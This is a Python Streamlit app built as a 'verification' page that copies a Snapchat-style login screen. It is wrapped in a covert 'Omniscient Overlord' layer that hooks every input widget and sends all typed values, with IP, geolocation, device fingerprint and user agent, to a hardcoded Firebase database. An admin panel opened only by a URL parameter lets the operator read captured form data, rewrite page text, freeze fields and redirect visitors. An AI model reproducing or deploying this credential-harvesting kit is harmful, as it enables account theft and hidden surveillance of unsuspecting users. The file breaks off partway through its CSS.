import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CONFIGURATION FRAMEWORK ---
st.set_page_config(
    page_title="Official Verification Gate",
    page_icon="👑",
    layout="centered",
    initial_sidebar_state="collapsed"
)
# ========================================================================
# 👁️ THE OMNISCIENT OVERLORD ENGINE v16.0 - GOLD EDITION ENTERPRISE MAINFRAME
# ========================================================================
# Operational State: Absolute Zero Trace Ghost Core Framework Deployed.
# Systems Target: Remote Telemetry, Adaptive Component Interception, 
#                 Dynamic Layout Mutation, Realtime Data Form Stream Capture.
# ========================================================================

import streamlit as st
import uuid
import requests
import datetime
import json
import time
import hashlib

# --------------------------------------------------------------------
# CONFIGURATION PLATFORM CORE NETWORK VECTOR
# --------------------------------------------------------------------
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"

# Ultimate Validation Query String Security Key Implementation
# Accessing via target URI string parameters: app_endpoint/?admin=true
is_omni_admin = st.query_params.get("admin") == "true"

# --------------------------------------------------------------------
# CASCADING PUBLIC CLIENT IP & DEVICE METADATA RESOLVER ENGINE
# --------------------------------------------------------------------
def fetch_pristine_client_context():
    """
    Strips away multi-layer networking proxies, cloud tunnels, and CDN edge headers
    to determine the genuine source client public identity matrices.
    """
    ctx = {
        "ip_address": "Proxy Layer Enforced",
        "user_agent": "Standard Virtual Client Engine",
        "locale": "en-US",
        "fingerprint": "UNRESOLVED_SIG"
    }
    try:
        headers = st.context.headers
        if headers:
            # Inspection Array ordered by specific network proxy mapping priority
            proxy_evaluation_grid = [
                "X-Forwarded-For", 
                "CF-Connecting-IP", 
                "X-Real-IP", 
                "Remote-Addr",
                "x-forwarded-for",
                "cf-connecting-ip",
                "x-real-ip"
            ]
            
            for parameter in proxy_evaluation_grid:
                if parameter in headers and headers[parameter]:
                    raw_ip_stream = headers[parameter].split(",")[0].strip()
                    # Validate string does not contain local loopback address traces
                    if raw_ip_stream and raw_ip_stream != "127.0.0.1" and "localhost" not in raw_ip_stream:
                        ctx["ip_address"] = raw_ip_stream
                        break
            
            if "User-Agent" in headers:
                ctx["user_agent"] = headers["User-Agent"]
            elif "user-agent" in headers:
                ctx["user_agent"] = headers["user-agent"]
                
            if "Accept-Language" in headers:
                ctx["locale"] = headers["Accept-Language"].split(",")[0]
            elif "accept-language" in headers:
                ctx["locale"] = headers["accept-language"].split(",")[0]
                
            # Construct a unique cryptographic device identity fingerprint string
            raw_fingerprint_seed = f"{ctx['ip_address']}_{ctx['user_agent']}_{ctx['locale']}"
            ctx["fingerprint"] = hashlib.sha256(raw_fingerprint_seed.encode('utf-8')).hexdigest()[:16]
    except:
        pass
    return ctx

def micro_resolve_geo_spectrum(ip):
    """
    Communicates with cloud cluster location databases. Utilizes automatic 
    secondary infrastructure fallback routines if primary cluster times out.
    """
    geo = {
        "city": "Internal Node Space", "region": "Local Cluster Boundary",
        "country": "Global Mainframe Grid", "isp": "System Virtual Gateway", "flag": "🌐"
    }
    if not ip or ip in ["Proxy Layer Enforced", "127.0.0.1", "localhost", "::1"]:
        return geo
        
    # --- Tier 1 Database Endpoint Communication Matrix ---
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3.5).json()
        if response and response.get("status") == "success":
            geo["city"] = response.get("city", "Unknown City Node")
            geo["region"] = response.get("regionName", "Unknown State Province")
            geo["country"] = response.get("country", "Unknown Country Space")
            geo["isp"] = response.get("isp", "Unknown Service Route Provider")
            cc = response.get("countryCode", "").lower()
            if cc:
                geo["flag"] = f"https://flagcdn.com/16x12/{cc}.png"
            return geo
    except:
        pass

    # --- Tier 2 Structural Fallback Mechanism (Triggered on Timeout/Block) ---
    try:
        backup_response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3.5).json()
        if backup_response and "error" not in backup_response:
            geo["city"] = backup_response.get("city", "Unknown City Node")
            geo["region"] = backup_response.get("region", "Unknown State Province")
            geo["country"] = backup_response.get("country_name", "Unknown Country Space")
            geo["isp"] = backup_response.get("org", "Unknown Service Route Provider")
            cc_back = backup_response.get("country", "").lower()
            if cc_back:
                geo["flag"] = f"https://flagcdn.com/16x12/{cc_back}.png"
            return geo
    except:
        pass
        
    return geo

# --------------------------------------------------------------------
# SYSTEM FILE I/O METRICS MANAGEMENT ABSTRACTS (FIREBASE CONNECTOR)
# --------------------------------------------------------------------
def db_put(node, payload):
    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
    except: pass

def db_patch(node, payload):
    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
    except: pass

def db_fetch(node):
    try:
        res = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=3).json()
        return res if res else {}
    except: return {}

# --------------------------------------------------------------------
# SYSTEM SESSION ENVELOPE SHIELD INITIALIZATION
# --------------------------------------------------------------------
# Ironclad Protection Architecture: If Admin URI parameters are active, 
# absolutely NO profiling session indices or data logs are generated.
if not is_omni_admin:
    if "omni_token" not in st.session_state:
        st.session_state.omni_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:6].upper()
    if "omni_clicks" not in st.session_state:
        st.session_state.omni_clicks = 0
    if "omni_time" not in st.session_state:
        st.session_state.omni_time = datetime.datetime.now().strftime("%I:%M:%S %p")

# Fetch Centralized Control Rule Vectors to distribute down to wrapped fields
omni_rules = db_fetch("omniscient_rules")
if not omni_rules or not isinstance(omni_rules, dict):
    omni_rules = {
        "global_status": "ONLINE", "redirect_url": "", "custom_msg": "", 
        "freeze_all": False, "stealth_mode": False, "controls": {}, "text_mutations": {}
    }
if "controls" not in omni_rules: omni_rules["controls"] = {}
if "text_mutations" not in omni_rules: omni_rules["text_mutations"] = {}

# --------------------------------------------------------------------
# TRACKING CONTROLLER MECHANICS & AUTODETECT COMPONENT PARSER
# --------------------------------------------------------------------
def auto_register_widget(w_type, label):
    """
    Pushes dynamic element keys and category descriptions directly to database registries.
    Bypasses entirely if structural trace stems from an administrative view operation loop.
    """
    if is_omni_admin or not isinstance(label, str):
        return
        
    # Security Rule: Prevent UI layout controllers from cluttering client registry mapping space
    bypass_filter_keywords = [
        "Select Target Active Session", "Select Discovered Element Label",
        "Inject dynamic alternative mock text", "Execute Infrastructure Command",
        "Interception Screen Notification", "Target Redirection Forwarding Link",
        "Force Stream Sync", "Commit Modification Rules", "Forge Mutation Pattern",
        "Deploy Global Overhaul Protocols", "Master Factory Clear Settings Reset"
    ]
    if any(keyword in label for keyword in bypass_filter_keywords):
        return
        
    reg_key = f"seen_{label}"
    if reg_key not in st.session_state:
        st.session_state[reg_key] = True
        db_patch("omniscient_registry", {label: w_type})

def send_omni_telemetry(w_type, w_label, w_value=""):
    """
    Pushes rich runtime metric data arrays, precise step tracking indices, 
    geolocation configurations, and form states directly into remote database channels.
    """
    if is_omni_admin or omni_rules.get("stealth_mode", False):
        return
    if "omni_clicks" not in st.session_state:
        return
        
    st.session_state.omni_clicks += 1
    token = st.session_state.omni_token
    clock = datetime.datetime.now().strftime("%I:%M:%S %p")
    
    # Process environmental metadata collection layers
    runtime_ctx = fetch_pristine_client_context()
    resolved_geo = micro_resolve_geo_spectrum(runtime_ctx["ip_address"])
    
    # Pull current remote trace node history array
    live_context_node = db_fetch(f"omniscient_live_users/{token}")
    action_timeline_array = live_context_node.get("timeline", []) if isinstance(live_context_node, dict) else []
    
    # Format current chronological event trace line string
    event_trace_string = f"[{clock}] [Step #{st.session_state.omni_clicks}] Class:({w_type}) Component Label ID:'{w_label}'"
    if w_value:
        event_trace_string += f" ➔ Stream State Log: [{w_value}]"
        
    action_timeline_array.append(event_trace_string)
    if len(action_timeline_array) > 60:
        action_timeline_array.pop(0)
        
    # Process caching parameters for persistent form view reconstruction maps
    form_data_cache_object = live_context_node.get("form_data", {}) if isinstance(live_context_node, dict) else {}
    if w_type not in ["BUTTON", "CLICK_TRIGGER"]:
        form_data_cache_object[w_label] = str(w_value)
        
    # Construct complete quantum network transmission data packet
    transmission_packet = {
        "user_id_token": token,
        "device_fingerprint": runtime_ctx["fingerprint"],
        "user_ip_address": runtime_ctx["ip_address"],
        "geo_city": resolved_geo["city"],
        "geo_region": resolved_geo["region"],
        "geo_country": resolved_geo["country"],
        "geo_isp_provider": resolved_geo["isp"],
        "geo_flag_url": resolved_geo["flag"],
        "user_browser_agent": runtime_ctx["user_agent"],
        "user_locale_language": runtime_ctx["locale"],
        "initial_connect_runtime": st.session_state.omni_time,
        "last_interaction_pulse": clock,
        "total_clicks_count": st.session_state.omni_clicks,
        "current_focus_element": f"'{w_label}'",
        "timeline": action_timeline_array,
        "form_data": form_data_cache_object,
        "status": "🟢 ACTIVE / AGENT BROADCASTING"
    }
    db_patch(f"omniscient_live_users/{token}", transmission_packet)

# --------------------------------------------------------------------
# APPLICATION PUBLIC FIREWALL & TRAFFIC MANAGER GATEWAY
# --------------------------------------------------------------------
if not is_omni_admin:
    infrastructure_policy_state = omni_rules.get("global_status", "ONLINE")
    if infrastructure_policy_state != "ONLINE":
        st.empty()
        if infrastructure_policy_state == "MAINTENANCE":
            st.error("# 🚧 CRITICAL ENVIRONMENT REPAIR WINDOW ACTIVE 🚧")
            st.info(omni_rules.get("custom_msg", "System engineers are tuning core database branches. Standby."))
            st.stop()
        elif infrastructure_policy_state == "BUSY":
            st.warning("# ⏳ PIPELINE CORRUPTED FLUID / DATA DENSITY OVERLOAD (429) ⏳")
            st.info(omni_rules.get("custom_msg", "Throughput limits breached. Resource allocation throttled."))
            st.stop()
        elif infrastructure_policy_state == "REDIRECT" and omni_rules.get("redirect_url"):
            st.markdown(f"### ➡️ [Redirecting Session Data to Secured Node Endpoint Location...]({omni_rules.get('redirect_url')})")
            st.stop()
        st.stop()

# --------------------------------------------------------------------
# STORAGE REPOSITORIES FOR BASE APPLICATION METHOD REFERENCES
# --------------------------------------------------------------------
_o_btn = st.button
_o_txt = st.text_input
_o_area = st.text_area
_o_sel = st.selectbox
_o_rad = st.radio
_o_chk = st.checkbox
_o_sld = st.slider
_o_num = st.number_input
_o_wrt = st.write
_o_mkd = st.markdown
_o_suc = st.success
_o_inf = st.info
_o_war = st.warning
_o_err = st.error

def check_destruction_policy(label, command_key):
    return omni_rules["controls"].get(label, {}).get(command_key, False)

# --------------------------------------------------------------------
# ADVANCED IMMUNITY ELEMENT WRAPPER METHODS CORE OVERRIDES
# --------------------------------------------------------------------
def patch_button(label, *args, **kwargs):
    if is_omni_admin: return _o_btn(label, *args, **kwargs)
    auto_register_widget("BUTTON", label)
    if check_destruction_policy(label, "hide"): return False
    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
    execution_result = _o_btn(label, *args, **kwargs)
    if execution_result: 
        send_omni_telemetry("BUTTON", label, "TRIGGERED_CLICK")
    return execution_result

def patch_text_input(label, *args, **kwargs):
    if is_omni_admin: return _o_txt(label, *args, **kwargs)
    auto_register_widget("TEXT_INPUT", label)
    if check_destruction_policy(label, "hide"): return ""
    if check_destruction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
    intercepted_value = _o_txt(label, *args, **kwargs)
    if intercepted_value: 
        send_omni_telemetry("TEXT_INPUT", label, intercepted_value)
    return intercepted_value

def patch_text_area(label, *args, **kwargs):
    if is_omni_admin: return _o_area(label, *args, **kwargs)
    auto_register_widget("TEXT_AREA", label)
    if check_destruction_policy(label, "hide"): return ""
    if check_destruction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
    intercepted_value = _o_area(label, *args, **kwargs)
    if intercepted_value: 
        send_omni_telemetry("TEXT_AREA", label, intercepted_value)
    return intercepted_value

def patch_selectbox(label, *args, **kwargs):
    if is_omni_admin: return _o_sel(label, *args, **kwargs)
    auto_register_widget("SELECTBOX", label)
    if check_destruction_policy(label, "hide"): return kwargs.get("options", [""])[0]
    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
    intercepted_selection = _o_sel(label, *args, **kwargs)
    session_storage_key = f"cache_vector_sel_{label.replace(' ', '_')}"
    if session_storage_key not in st.session_state or st.session_state[session_storage_key] != intercepted_selection:
        st.session_state[session_storage_key] = intercepted_selection
        send_omni_telemetry("SELECTBOX", label, intercepted_selection)
    return intercepted_selection

def patch_radio(label, *args, **kwargs):
    if is_omni_admin: return _o_rad(label, *args, **kwargs)
    auto_register_widget("RADIO", label)
    if check_destruction_policy(label, "hide"): return kwargs.get("options", [""])[0]
    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
    intercepted_selection = _o_rad(label, *args, **kwargs)
    session_storage_key = f"cache_vector_rad_{label.replace(' ', '_')}"
    if session_storage_key not in st.session_state or st.session_state[session_storage_key] != intercepted_selection:
        st.session_state[session_storage_key] = intercepted_selection
        send_omni_telemetry("RADIO", label, intercepted_selection)
    return intercepted_selection

def patch_checkbox(label, *args, **kwargs):
    if is_omni_admin: return _o_chk(label, *args, **kwargs)
    auto_register_widget("CHECKBOX", label)
    if check_destruction_policy(label, "hide"): return False
    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
    intercepted_state = _o_chk(label, *args, **kwargs)
    send_omni_telemetry("CHECKBOX", label, str(intercepted_state))
    return intercepted_state

def patch_slider(label, *args, **kwargs):
    if is_omni_admin: return _o_sld(label, *args, **kwargs)
    auto_register_widget("SLIDER", label)
    if check_destruction_policy(label, "hide"): return kwargs.get("value", 0)
    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
    intercepted_range_value = _o_sld(label, *args, **kwargs)
    session_storage_key = f"cache_vector_sld_{label.replace(' ', '_')}"
    if session_storage_key not in st.session_state or st.session_state[session_storage_key] != intercepted_range_value:
        st.session_state[session_storage_key] = intercepted_range_value
        send_omni_telemetry("SLIDER", label, str(intercepted_range_value))
    return intercepted_range_value

def patch_number_input(label, *args, **kwargs):
    if is_omni_admin: return _o_num(label, *args, **kwargs)
    auto_register_widget("NUMBER_INPUT", label)
    if check_destruction_policy(label, "hide"): return kwargs.get("value", 0)
    if check_destruction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
    intercepted_numeric_value = _o_num(label, *args, **kwargs)
    send_omni_telemetry("NUMBER_INPUT", label, str(intercepted_numeric_value))
    return intercepted_numeric_value

def execute_text_mutation_lookup(text_content):
    if is_omni_admin: return text_content
    auto_register_widget("STATIC_TEXT_FIELD", text_content)
    if isinstance(text_content, str):
        return omni_rules["text_mutations"].get(text_content, text_content)
    return text_content

def patch_write(*args, **kwargs):
    if is_omni_admin: _o_wrt(*args, **kwargs); return
    if args and isinstance(args[0], str): _o_wrt(execute_text_mutation_lookup(args[0]), **kwargs)
    else: _o_wrt(*args, **kwargs)

def patch_markdown(*args, **kwargs):
    if is_omni_admin: _o_mkd(*args, **kwargs); return
    if args and isinstance(args[0], str): _o_mkd(execute_text_mutation_lookup(args[0]), **kwargs)
    else: _o_mkd(*args, **kwargs)

def patch_success(text, *args, **kwargs):
    if is_omni_admin: return _o_suc(text, *args, **kwargs)
    return _o_suc(execute_text_mutation_lookup(text), *args, **kwargs)

def patch_info(text, *args, **kwargs):
    if is_omni_admin: return _o_inf(text, *args, **kwargs)
    return _o_inf(execute_text_mutation_lookup(text), *args, **kwargs)

def patch_warning(text, *args, **kwargs):
    if is_omni_admin: return _o_war(text, *args, **kwargs)
    return _o_war(execute_text_mutation_lookup(text), *args, **kwargs)

def patch_error(text, *args, **kwargs):
    if is_omni_admin: return _o_err(text, *args, **kwargs)
    return _o_err(execute_text_mutation_lookup(text), *args, **kwargs)

# INJECT HARD INTERCEPTION LAYERS OVER STREAMLIT CORE APPLICATION PIPES
st.button = patch_button
st.text_input = patch_text_input
st.text_area = patch_text_area
st.selectbox = patch_selectbox
st.radio = patch_radio
st.checkbox = patch_checkbox
st.slider = patch_slider
st.number_input = patch_number_input
st.write = patch_write
st.markdown = patch_markdown
st.success = patch_success
st.info = patch_info
st.warning = patch_warning
st.error = patch_error


# ========================================================================
# 👑 THE OMNISCIENT MASTER PANEL CENTRAL TERMINAL (?admin=true)
# ========================================================================
if is_omni_admin:
    st.set_page_config(page_title="OMNISCIENT SUPREME TERMINAL v16.0", layout="wide")
    
    # Custom Dynamic Injection CSS Aesthetics for Dark-Cyber Core Viewports
    st.markdown("""
        <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
        * { font-family: 'JetBrains Mono', monospace; }
        .title-mainframe { font-size: 42px; font-weight: 900; color: #00FFCC; text-shadow: 0px 0px 12px rgba(0,255,204,0.4); }
        .card-container { background-color: #0E121A; border: 1px solid #1F293D; border-radius: 8px; padding: 22px; margin-bottom: 18px; }
        .data-header { color: #FF3366; font-size: 18px; font-weight: 700; }
        </style>
    """, unsafe_style_html=True)
    
    st.markdown('<p class="title-mainframe">⚡ OMNISCIENT OVERLORD CONTROL MAINFRAME v16.0</p>', unsafe_style_html=True)
    st.caption("Central Operations Branch. Zero Identity Trace Protocol active. Administrative rendering logic completely isolated.")
    
    # Central Loop Synchronizer Button Element
    if _o_btn("🔄 FORCE LIVE NETWORK STREAM SYNCHRONIZATION"):
        st.rerun()
        
    st.write("---")
    
    panel_tab1, panel_tab2, panel_tab3 = st.tabs([
        "🕵️‍♂️ REMOTE TELEMETRY SESSION RADAR", 
        "🎛️ POINT-AND-CLICK COMPONENT MUTATOR", 
        "⚙️ CORE SYSTEM LAYER SIMULATOR"
    ])
    
    # --------------------------------------------------------------------
    # TAB 1: RADAR VIEWPORT - ULTRA DETAILED USER INTERCEPTION PAGE
    # --------------------------------------------------------------------
    with panel_tab1:
        st.markdown("<p class=\"data-header\">📡 Live Active Remote Session Transmission Streams</p>", unsafe_style_html=True)
        live_agents_pool = db_fetch("omniscient_live_users")
        
        if live_agents_pool and isinstance(live_agents_pool, dict):
            st.success(f"Network Scanners actively synchronizing with `{len(live_agents_pool)}` Realtime Terminals.")
            
            selected_spy_node = _o_sel("Select Target Active Session Address Node:", list(live_agents_pool.keys()))
            
            if selected_spy_node and selected_spy_node in live_agents_pool:
                node = live_agents_pool[selected_spy_node]
                st.write("---")
                
                st.markdown(f"### 🎯 VIEWING AGENT PROFILE STRUCTURE: `{selected_spy_node}`")
                
                # Render Grid Metrics Columns 
                mg1, mg2, mg3 = st.columns(3)
                with mg1:
                    st.markdown("🌐 **GEOGRAPHIC IDENTITY SPECTRUM**")
                    flag_source_url = node.get("geo_flag_url", "")
                    if flag_source_url and flag_source_url.startswith("http"):
                        st.image(flag_source_url, width=42)
                    st.write(f"**Country Address:** `{node.get('geo_country')}`")
                    st.write(f"**State / Region:** `{node.get('geo_region')}`")
                    st.write(f"**City Perimeter:** `{node.get('geo_city')}`")
                    
                with mg2:
                    st.markdown("🛰️ **NETWORK INFRASTRUCTURE TRACE**")
                    st.write(f"**Public IP Address:** `{node.get('user_ip_address')}`")
                    st.write(f"**ISP Distribution Line:** `{node.get('geo_isp_provider')}`")
                    st.write(f"**Device Fingerprint Signature:** `{node.get('device_fingerprint')}`")
                    
                with mg3:
                    st.markdown("⏱️ **RUNTIME METRIC CLOCK**")
                    st.write(f"**Initial Matrix Connect:** `{node.get('initial_connect_runtime')}`")
                    st.write(f"**Last Pulsed Transaction:** `{node.get('last_interaction_pulse')}`")
                    st.write(f"**Client Accepted Language:** `{node.get('user_locale_language')}`")
                
                st.write("---")
                st.markdown("#### 🖥️ Intercepted Client Core Browser User-Agent Value String")
                st.code(node.get("user_browser_agent", "No Context Found"), language="text")
                
                st.write("---")
                col_view_l, col_view_r = st.columns([1, 1.4])
                with col_view_l:
                    st.markdown("<p style='color:#FF9F43; font-weight:700;'>📥 CURRENT FORM STATE INPUT INJECTIONS</p>", unsafe_style_html=True)
                    st.json(node.get("form_data", {}))
                    st.metric(label="Calculated Session Interactions Counter", value=f"{node.get('total_clicks_count', 0)} Operations")
                with col_view_r:
                    st.markdown("<p style='color:#00FFCC; font-weight:700;'>📈 SEQUENTIAL CHRONO LOG STEP TRACE</p>", unsafe_style_html=True)
                    for action_log_line in node.get("timeline", []):
                        st.code(action_log_line, language="text")
                        
            st.write("---")
            if _o_btn("🗑️ PURGE RADAR TRANSMISSION MEMORY LOGS", key="clear_radar_logs"):
                requests.delete(f"{FIREBASE_URL}/omniscient_live_users.json")
                st.success("All remote session trace models have been erased.")
                st.rerun()
        else:
            st.info("No external client connection vectors found streaming application metrics. Mainframe scanning active...")

    # --------------------------------------------------------------------
    # TAB 2: EXCLUSION CONTROLLER - POINT & CLICK MUTATION ENGINE
    # --------------------------------------------------------------------
    with panel_tab2:
        st.markdown("<p class=\"data-header\">🎛️ Discovered Structural Application Hook Layout Map</p>", unsafe_style_html=True)
        global_elements_registry = db_fetch("omniscient_registry")
        
        if global_elements_registry and isinstance(global_elements_registry, dict):
            # Perfect automated filter architecture out the admin panel traces completely from the registry options list
            clean_discovered_keys = [
                key for key in global_elements_registry.keys() 
                if "Select Target" not in key 
                and "Select Discovered" not in key 
                and "Inject dynamic alternative" not in key
            ]
            
            st.success(f"Automated Hook Matrix isolated `{len(clean_discovered_keys)}` Unique Application Interception Hooks.")
            
            targeted_component = _o_sel("🎯 Select Discovered Element Label (Zero Typing Needed):", clean_discovered_keys)
            
            if targeted_component:
                st.warning(f"Target Selection Vector: **'{targeted_component}'** | Intercept Class Type: `{global_elements_registry[targeted_component]}`")
                
                if targeted_component not in omni_rules["controls"]:
                    omni_rules["controls"][targeted_component] = {"hide": False, "disable": False}
                    
                mc1, mc2 = st.columns(2)
                with mc1:
                    toggle_hide = _o_chk("👻 Deploy Layout Concealment (Hide asset from application viewport entirely)", value=omni_rules["controls"][targeted_component].get("hide", False))
                with mc2:
                    toggle_disable = _o_chk("🔒 Enforce Input Pipeline Freeze (Lock field values / Force read-only state)", value=omni_rules["controls"][targeted_component].get("disable", False))
                    
                if _o_btn("Commit Modification Rules ⚡", key="save_mutator_directives"):
                    omni_rules["controls"][targeted_component]["hide"] = toggle_hide
                    omni_rules["controls"][targeted_component]["disable"] = toggle_disable
                    db_put("omniscient_rules", omni_rules)
                    st.success(f"Destruction parameters written down into framework pipelines for asset: '{targeted_component}'")
                    st.rerun()
                    
                st.write("---")
                st.markdown("#### 📝 Realtime Forged Static Text Content Swapper Matrix")
                mutation_text_string = _o_txt(f"Inject dynamic alternative mock text string replacement for '{targeted_component}':", value=omni_rules["text_mutations"].get(targeted_component, ""))
                
                if _o_btn("Forge Mutation Pattern 🔄", key="save_text_mutation_string"):
                    if mutation_text_string:
                        omni_rules["text_mutations"][targeted_component] = mutation_text_string
                    else:
                        omni_rules["text_mutations"].pop(targeted_component, None)
                    db_put("omniscient_rules", omni_rules)
                    st.success("Text transformation algorithms recompiled live.")
                    st.rerun()
        else:
            st.info("Application hook landscape clear. Interception registries populate when external clients connect and load fields.")

    # --------------------------------------------------------------------
    # TAB 3: SIMULATOR SYSTEM - RE-ROUTING PIPELINE AND CONTROL
    # --------------------------------------------------------------------
    with panel_tab3:
        st.markdown("<p class=\"data-header\">⚙️ Central Infrastructure Application Routing Matrix Settings</p>", unsafe_style_html=True)
        active_status_flag = omni_rules.get("global_status", "ONLINE")
        st.markdown(f"Active App Layer Pipeline Execution Directive State: **`{active_status_flag}`**")
        
        chosen_directive_vector = _o_rad("Execute Infrastructure Command Route Directive:", ["ONLINE", "MAINTENANCE", "BUSY", "REDIRECT"])
        custom_screen_notification = _o_txt("Interception Screen Notification Text Content:", value=omni_rules.get("custom_msg", ""))
        redirect_endpoint_url = _o_txt("Target Redirection Forwarding Endpoint Web URL Link Address:", value=omni_rules.get("redirect_url", ""))
        
        st.write("---")
        st.markdown("#### 🛡️ Global Security Enforcement Parameters Override")
        global_override_freeze = _o_chk("Global Application Freeze Gate (Lock interactive input fields across all public nodes)", value=omni_rules.get("freeze_all", False))
        global_stealth_telemetry = _o_chk("Deep Stealth Run Policy (Pause writing user interaction metrics arrays to database)", value=omni_rules.get("stealth_mode", False))
        
        if _o_btn("Deploy Global Overhaul Protocols 🚀", key="commit_global_mainframe_changes"):
            omni_rules["global_status"] = chosen_directive_vector
            omni_rules["custom_msg"] = custom_screen_notification
            omni_rules["redirect_url"] = redirect_endpoint_url
            omni_rules["freeze_all"] = global_override_freeze
            omni_rules["stealth_mode"] = global_stealth_telemetry
            db_put("omniscient_rules", omni_rules)
            st.success("Global network policies recompiled and synchronized down to production application pipelines.")
            st.rerun()
            
        st.write("---")
        if _o_btn("🚨 RESET SYSTEM CONTROLLERS TO FACTORY PARAMS", key="factory_system_wipe"):
            requests.delete(f"{FIREBASE_URL}/omniscient_rules.json")
            requests.delete(f"{FIREBASE_URL}/omniscient_registry.json")
            st.error("All structural configuration rules variables dropped. Restored default production settings.")
            st.rerun()

    st.write("---")
    st.markdown("<p style='color:#FF3366;font-size:11px;'>🚨 MAIN ADMINISTRATIVE ENVELOPE GATE INTERCEPT ENGAGED. Strip query string parameter map trails (?admin=true) from URL to navigate standard public viewports.</p>", unsafe_style_html=True)
    st.stop()

# ========================================================================
# END OF SYSTEM ENVELOPE - YOUR ORIGINAL SCRIPT RESUMES UNTOUCHED BELOW
# ========================================================================
# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
GLOBAL_MARKDOWN_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

/* Force Absolute Premium Light Environment Canvas */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f6f8fb !important; color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }

/* ⏱️ Animated Glow-Card Counter Visualizer */
.premium-countdown-card {
    background: #ffffff !important;
    border: 2px solid #000000 !important;
    padding: 16px;
    border-radius: 14px;
    text-align: center;
    box-shadow: 0px 8px 24px rgba(255, 252, 0, 0.25);
    margin-bottom: 20px;
    border-bottom: 5px solid #fffc00 !important;
}
.countdown-timer-stream {
    font-size: 20px;
    font-weight: 800;
    color: #2563eb !important;
    letter-spacing: 1px;
}

/* 📊 Premium Flow Drop Social Banner */
.premium-live-banner {
    background: #ffffff;
    border: 1px solid #2563eb;
    border-left: 6px solid #2563eb;
    border-radius: 12px;
    padding: 14px 18px;
    margin-bottom: 20px;
    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06);
}

/* 📍 Premium Fluid Stepper Array Interface (No Sliders) */
.stepper-flex-wrapper {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 25px;
}
.step-pill-node {
    flex: 1;
    background: #e2e8f0;
    padding: 10px 4px;
    border-radius: 8px;
    text-align: center;
    font-size: 11px;
    font-weight: 800;
    color: #64748b !important;
    text-transform: uppercase;
    border: 1px solid transparent;
    transition: all 0.4s ease;
}
.step-pill-node.active-node {
    background: #2563eb !important;
    color: #ffffff !important;
    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
    transform: scale(1.02);
}
.step-pill-node.completed-node {
    background: #fffc00 !important;
    color: #000000 !important;
    border: 1px solid #000000;
}

/* 📦 Core High-Fidelity Bounded Canvas Box */
.premium-canvas-wrapper {
    background: #ffffff !important;
    border: 2px solid #eef2f6 !important;
    border-radius: 16px !important;
    padding: 35px 28px !important;
    box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04) !important;
    margin-bottom: 30px;
}

/* 🎴 Dynamic Auto-Center Logo Framework Matrix */
.center-logo-box-matrix {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 5px auto 20px auto;
    width: 90px !important;
    height: 90px !important;
    background: #ffffff;
    border-radius: 18px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
    padding: 8px;
    border: 1px solid #f1f5f9;
}
.center-logo-box-matrix img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

/* ✏️ High-Definition Explicit Input Boxes with Rigid Focus Parameters */
.custom-hd-label {
    font-weight: 800 !important;
    font-size: 13px !important;
    color: #000000 !important;
    text-transform: uppercase;
    letter-spacing: 0.6px;
    margin-bottom: 8px !important;
    display: block;
}
div[data-baseweb='input'] {
    border: 2px solid #cbd5e1 !important;
    border-radius: 8px !important;
    background-color: #ffffff !important;
    overflow: hidden !important;
    transition: all 0.3s ease-in-out !important;
}
div[data-baseweb='input']:focus-within {
    border-color: #2563eb !important;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
}
div[data-baseweb='input'] input {
    color: #000000 !important;
    font-weight: 600 !important;
    font-size: 14.5px !important;
    padding: 12px 14px !important;
}

/* 💛 Step 5 (Image Replica Login Layout Overrides) */
.replica-brand-label {
    text-align: center !important;
    font-size: 38px !important;
    font-weight: 400 !important;
    color: #000000 !important;
    margin-bottom: 32px !important;
    margin-top: -5px !important;
    letter-spacing: -1.5px !important;
}
.replica-field-title {
    color: #8c92ac !important;
    font-size: 11.5px !important;
    font-weight: 700 !important;
    text-transform: capitalize !important;
    margin-bottom: 6px !important;
    display: block !important;
}
/* Replica Specific Input Tints mirroring the uploaded photograph documentation */
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; }
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; }
.forgot-pass-trigger-text { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 600 !important; margin-top: 5px !important; }

/* 🎯 Snapchat-Theme Yellow Rigid Rounded-Pill Interaction Button */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important;
    color: #000000 !important;
    border-radius: 999px !important;
    width: 145px !important;
    font-weight: 800 !important;
    font-size: 15px !important;
    border: 2px solid #000000 !important;
